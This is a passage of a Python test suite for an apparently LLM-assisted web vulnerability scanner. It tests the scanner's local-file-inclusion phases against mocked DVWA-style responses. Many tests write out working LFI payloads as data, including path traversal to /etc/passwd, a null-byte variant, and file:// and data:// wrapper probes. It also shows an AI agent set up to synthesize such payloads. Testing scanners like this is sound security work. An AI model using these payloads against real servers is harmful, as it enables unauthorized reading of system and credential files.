        → a prefix-preserving traversal payload (``file/../../../../etc/passwd``)."""
        agent = _make_agent()
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.DIRECT_READ,
            LFITraversalPrimitives(traversal_sequence=None),
            _baseline(value="file"),
        )
        assert synth is not None
        assert synth["payload"] == "file/../../../../etc/passwd"
        assert synth["indicator_type"] == "file_signature"

    @pytest.mark.asyncio
    async def test_data_wrapper_requires_inline_render_not_divergence(self) -> None:
        """The data:// wrapper is confirmed only when its inline payload is
        rendered back — a diverging block page is not enough (honest wrappers)."""
        page = _make_page()

        async def blocked(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if "etc/passwd" in value or "://" in value:
                return _HTTPResponse(status=200, body="ERROR: File not found!")
            return _HTTPResponse(status=200, body="X" * 5000)

        agent = _make_agent()
        agent._technologies = ["php"]
        agent._send_probe = blocked  # type: ignore[method-assign]
        _c, baselines = await agent._lfi_phase1_injection_point(page, "page")
        primitives, _e = await agent._lfi_phase2_fingerprint(page, "page", baselines)
        assert "data://" not in primitives.wrapper_support

        async def renders(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if value.startswith("data://"):
                return _HTTPResponse(status=200, body="<html>clinkz</html>")
            if "etc/passwd" in value or "://" in value:
                return _HTTPResponse(status=200, body="ERROR: File not found!")
            return _HTTPResponse(status=200, body="X" * 5000)

        agent2 = _make_agent()
        agent2._technologies = ["php"]
        agent2._send_probe = renders  # type: ignore[method-assign]
        _c2, baselines2 = await agent2._lfi_phase1_injection_point(page, "page")
        prim2, _e2 = await agent2._lfi_phase2_fingerprint(page, "page", baselines2)
        assert "data://" in prim2.wrapper_support


# ===========================================================================
# LFI regression — real-pipeline reproductions (PR #75, engagements 9f1b3950 /
# e32346c0). These exercise the LIVE-LLM path with realistic inputs, not the
# silent-LLM fallback the prior unit suite pinned (LESSONS.md #18: a green
# smoke over a stubbed LLM proves only the deterministic fallback):
#
#   BUG A: recon named no PHP and the live LLM appended a dead ``%00`` to the
#          confirmed absolute ``/etc/passwd`` read, so phase 5 re-probed a
#          broken payload and the genuine read never re-confirmed (fi/low+med).
#   BUG B: ``_is_php_stack()`` was False (recon miss), so the PHP-only wrapper
#          loop was skipped and ``file://`` was never probed at fi/high.
# ===========================================================================


class _LFILiveLLM(LLMClient):
    """LLM that emits *live* Anthropic-style answers keyed off the prompt shape.

    Phase-3 rank prompts get a ranking; phase-4 synthesis prompts get a payload
    the real LLM would produce — including the dead ``%00`` suffix that broke
    the confirmed read (BUG A). Unlike the silent ``_ScriptedLLM(answers=[""])``
    fixture, this drives the same code path the real pipeline exercises.
    """

    def __init__(self, *, rank: str, synth: str) -> None:
        self._rank = rank
        self._synth = synth
        self.prompts: list[str] = []

    async def reason(
        self, messages: list[LLMMessage], tools: list[dict[str, Any]] | None = None
    ) -> Any:
        raise NotImplementedError

    async def research(self, query: str) -> str:
        return ""

    async def generate_text(self, prompt: str, **_kw: object) -> str:
        self.prompts.append(prompt)
        if "Synthesize a local-file-inclusion payload" in prompt:
            return self._synth
        return self._rank


class TestFix1PhpStackDetection:
    """FIX 1: a PHPSESSID session cookie is ground-truth PHP even when recon's
    LLM tech extraction named no PHP (the DVWA 9f1b3950 / e32346c0 miss)."""

    def test_phpsessid_cookie_implies_php_stack(self) -> None:
        agent = _make_agent()
        agent._technologies = []  # recon named no PHP
        assert agent._is_php_stack() is False
        agent._session_cookies = {"PHPSESSID": "abc", "security": "high"}
        assert agent._is_php_stack() is True

    def test_php_in_technologies_still_wins(self) -> None:
        agent = _make_agent()
        agent._technologies = ["php", "mysql"]
        assert agent._is_php_stack() is True

    def test_non_php_session_cookie_stays_non_php(self) -> None:
        """A Node/Juice-Shop token cookie must NOT read as a PHP stack."""
        agent = _make_agent()
        agent._technologies = ["node.js", "express"]
        agent._session_cookies = {"token": "ey...", "language": "en"}
        assert agent._is_php_stack() is False


class TestFix3PrefersConfirmedBuild:
    """FIX 2: phase 4 prefers the empirically-grounded deterministic build over
    the live LLM when phase 2 CONFIRMED the read; phase 3 leads with the
    confirmed retrieval type so it is never dropped from the tried window."""

    @pytest.mark.asyncio
    async def test_phase4_absolute_read_ignores_llm_null_byte(self) -> None:
        """BUG A: prefix_required (absolute /etc/passwd confirmed) → phase 4
        returns the clean absolute path, NOT the LLM's dead ``%00`` payload."""
        llm = _LFILiveLLM(
            rank='{"ranked":[{"type":"direct_read"}]}',
            synth=(
                '{"payload": "/etc/passwd%00", "expected_indicator": "root:x:0:0:", '
                '"indicator_type": "file_signature", "rationale": "null-byte truncation"}'
            ),
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.DIRECT_READ,
            LFITraversalPrimitives(prefix_required=True, suffix_handling="appends_extension"),
            _baseline(value="include.php"),
        )
        assert synth is not None
        assert synth["payload"] == "/etc/passwd"  # deterministic, not /etc/passwd%00

    @pytest.mark.asyncio
    async def test_phase4_file_wrapper_ignores_llm_guess(self) -> None:
        """BUG B: file:// confirmed → phase 4 returns file:///etc/passwd even if
        the LLM would synthesize a traversal guess."""
        llm = _LFILiveLLM(
            rank='{"ranked":[{"type":"wrapper_extraction"}]}',
            synth=(
                '{"payload": "../../../../etc/passwd", "expected_indicator": "root", '
                '"indicator_type": "file_signature", "rationale": "traversal"}'
            ),
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        synth = await agent._lfi_phase4_synthesize_payload(
            LFIRetrievalType.WRAPPER_EXTRACTION,
            LFITraversalPrimitives(wrapper_support=["file://"]),
            _baseline(value="include.php"),
        )
        assert synth is not None
        assert synth["payload"] == "file:///etc/passwd"

    @pytest.mark.asyncio
    async def test_phase3_leads_with_confirmed_wrapper_even_if_llm_omits(self) -> None:
        """FIX 2a: file:// confirmed but the LLM ranking omits wrapper_extraction
        → it is prepended so phase 5 still tries it (fi/high robustness)."""
        llm = _ScriptedLLM(
            answers=['{"ranked":[{"type":"direct_read"},{"type":"error_based_path"}]}']
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(wrapper_support=["file://"]),
            {},
        )
        assert ranking.ranked[0] == LFIRetrievalType.WRAPPER_EXTRACTION
        assert LFIRetrievalType.WRAPPER_EXTRACTION in attempt_window(
            ranking.ranked, ranking.supported
        )

    @pytest.mark.asyncio
    async def test_phase3_llm_order_preserved_when_confirmed_present(self) -> None:
        """The confirmed-lead reorder must not disturb the LLM's order when the
        confirmed type is already ranked first."""
        llm = _ScriptedLLM(
            answers=['{"ranked":[{"type":"direct_read"},{"type":"wrapper_extraction"}]}']
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        ranking = await agent._lfi_phase3_rank_retrieval_types(
            LFITraversalPrimitives(prefix_required=True),  # DIRECT_READ confirmed
            {"absolute_passwd_match": True},
        )
        assert ranking.ranked[0] == LFIRetrievalType.DIRECT_READ
        assert ranking.ranked[1] == LFIRetrievalType.WRAPPER_EXTRACTION


class TestLFIRealPipelineReproduction:
    """End-to-end ``_test_lfi`` with the exact real-pipeline conditions the old
    harness masked: recon named NO php, a PHPSESSID cookie is present, and an
    ACTIVE LLM returns live-vocabulary payloads. A finding must still emit."""

    @pytest.mark.asyncio
    async def test_fi_low_absolute_read_emits_despite_missing_recon_php(self) -> None:
        """fi/low style: only the clean absolute ``/etc/passwd`` reads; the LLM
        would append ``%00``. Finding emits via the deterministic build."""
        llm = _LFILiveLLM(
            rank='{"ranked":[{"type":"direct_read"},{"type":"wrapper_extraction"}]}',
            synth=(
                '{"payload": "/etc/passwd%00", "expected_indicator": "root:x:0:0:", '
                '"indicator_type": "file_signature", "rationale": "null-byte"}'
            ),
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        agent._technologies = []  # recon named no PHP
        agent._session_cookies = {"PHPSESSID": "s", "security": "low"}

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if value == "/etc/passwd":  # clean absolute read works (no %00)
                return _HTTPResponse(
                    status=200, body="root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin"
                )
            return _HTTPResponse(status=200, body="<html>page</html>" * 40)

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page("http://t/vulnerabilities/fi/?page=include.php", params=["page"])
        findings = await agent._test_lfi(page)
        assert len(findings) == 1
        joined = " ".join(findings[0].evidence)
        assert "/etc/passwd" in joined
        assert "%00" not in findings[0].evidence[-1] or "payload=/etc/passwd\n" not in joined

    @pytest.mark.asyncio
    async def test_fi_high_file_wrapper_unlock_end_to_end(self) -> None:
        """fi/high style: naive ``../`` and absolute ``/etc/passwd`` are filtered
        to a block page; only ``file:///etc/passwd`` reads. With no php in
        _technologies but a PHPSESSID cookie, the wrapper loop runs, file:// is
        probed and confirmed, and a finding emits — even though the LLM ranking
        omits wrapper_extraction and the LLM synth is a traversal guess."""
        llm = _LFILiveLLM(
            rank='{"ranked":[{"type":"direct_read"},{"type":"error_based_path"}]}',
            synth=(
                '{"payload": "include.php/../../../etc/passwd", "expected_indicator": "root", '
                '"indicator_type": "file_signature", "rationale": "prefix traversal"}'
            ),
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        agent._technologies = []  # recon named no PHP
        agent._session_cookies = {"PHPSESSID": "s", "security": "high"}

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if value == "file:///etc/passwd":  # fnmatch("file*") passes → PHP reads it
                return _HTTPResponse(
                    status=200, body="root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin"
                )
            if "etc/passwd" in value or "../" in value or "://" in value:
                return _HTTPResponse(status=200, body="ERROR: File not found!")
            return _HTTPResponse(status=200, body="<html>page</html>" * 40)

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page("http://t/vulnerabilities/fi/?page=include.php", params=["page"])
        findings = await agent._test_lfi(page)
        assert len(findings) == 1
        joined = " ".join(findings[0].evidence)
        assert "file:///etc/passwd" in joined
        assert "wrapper_extraction" in joined

    @pytest.mark.asyncio
    async def test_fi_impossible_whitelist_emits_nothing(self) -> None:
        """fi/impossible style: a whitelist rejects every probe (no signature
        anywhere) → no confirmation, no finding, no phantom."""
        llm = _LFILiveLLM(
            rank='{"ranked":[{"type":"direct_read"},{"type":"wrapper_extraction"}]}',
            synth=(
                '{"payload": "include.php/../../etc/passwd", "expected_indicator": "root", '
                '"indicator_type": "file_signature", "rationale": "guess"}'
            ),
        )
        agent = _make_agent(llm)
        agent._methodology_llm = llm
        agent._technologies = []
        agent._session_cookies = {"PHPSESSID": "s", "security": "impossible"}

        async def fake_probe(_page: PageAnalysis, _param: str, value: str) -> _HTTPResponse:
            if value in ("include.php", "file1.php", "file2.php", "file3.php"):
                return _HTTPResponse(status=200, body="<html>allowed page</html>" * 40)
            return _HTTPResponse(status=200, body="ERROR: File not found!")

        agent._send_probe = fake_probe  # type: ignore[method-assign]
        page = _make_page("http://t/vulnerabilities/fi/?page=include.php", params=["page"])
        findings = await agent._test_lfi(page)
        assert findings == []
